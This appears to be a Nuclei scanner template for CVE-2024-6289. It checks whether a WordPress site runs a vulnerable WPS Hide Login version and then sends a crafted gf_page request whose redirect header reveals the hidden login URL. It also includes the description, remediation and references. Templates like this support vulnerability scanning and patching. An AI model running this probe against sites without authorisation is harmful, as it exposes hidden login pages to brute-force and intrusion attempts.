flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"WPS Hide Login")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /wp-content/plugins/wps-hide-login/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - kval:
    - location
    type: kval
  matchers:
  - condition: and
    dsl:
    - '!contains(tolower(location), "wp-login.php")'
    - contains(header,"%2F%3Fgf_page%3D{{string}}&reauth=1")
    type: dsl
  raw:
  - 'GET /?gf_page={{string}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-6289
info:
  author: s4e-io
  classification:
    epss-percentile: 0.91717
    epss-score: 0.07883
  description: 'The WPS Hide Login WordPress plugin before 1.9.16.4 does not prevent
    redirects to the login page via the auth_redirect WordPress function, allowing
    an unauthenticated visitor to access the hidden login page.

    '
  impact: 'Unauthenticated attackers can discover and access the hidden WordPress
    login page by exploiting improper redirect handling, defeating the security-by-obscurity
    measure.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: wps_hide_login
    publicwww-query: /wp-content/plugins/wps-hide-login/
    vendor: wpserveur
    verified: true
  name: WPS Hide Login < 1.9.16.4 - Hidden Login Page Disclosure
  reference:
  - https://wpscan.com/vulnerability/fd6d0362-df1d-4416-b8b5-6e5d0ce84793/
  - https://nvd.nist.gov/vuln/detail/CVE-2024-6289
  - https://www.sprocketsecurity.com/resources/discovering-wp-admin-urls-in-wordpress-with-gravityforms/
  remediation: 'Update WPS Hide Login plugin to version 1.9.16.4 or later to address
    the login page disclosure vulnerability.

    '
  severity: medium
  tags: cve,cve2024,bypass,wp-plugin,wpscan,wordpress,wps-hide-login,vuln
variables:
  string: '{{rand_text_alpha(10)}}'
